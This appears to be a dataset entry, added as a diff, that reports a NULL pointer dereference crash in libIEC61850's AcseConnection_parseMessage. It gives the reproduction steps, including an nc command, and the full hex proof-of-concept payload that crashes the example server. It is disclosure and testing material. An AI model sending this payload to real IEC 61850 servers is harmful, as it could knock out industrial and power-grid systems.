@@ -1,0 +1,10 @@
+Number: 368
+
+Summarize:
+In version 8eeb6f0, sending the provided PoC input to server_example_basic_io triggers a NULL pointer dereference in AcseConnection_parseMessage at src/mms/iso_acse/acse.c:429. The observed result is a segmentation fault/application crash; AddressSanitizer reports a SEGV caused by a READ from address 0x000000000000 with the top frame in AcseConnection_parseMessage.
+
+Reproduce:
+Reported environment: Ubuntu 20.04 focal on AMD EPYC 7742 64-Core @ 16x 2.25GHz. Start the example server with ./server_example_basic_io. Prepare a file named poc using the provided PoC payload string 0300001602F0800D0D0100C1013181020001A2020000. Then send it to the server with: nc 0.0.0.0 102 < poc. Expected result: the server prints "Using libIEC61850 version 1.5.0" and "Connection opened", then AddressSanitizer reports DEADLYSIGNAL/SEGV on address 0x000000000000 caused by a READ, with the top frame AcseConnection_parseMessage (src/mms/iso_acse/acse.c:429), and the process aborts.
+
+Payload:
+03 00 00 16 02 f0 80 0d 0d 01 00 c1 01 31 81 02 00 01 a2 02 00 00
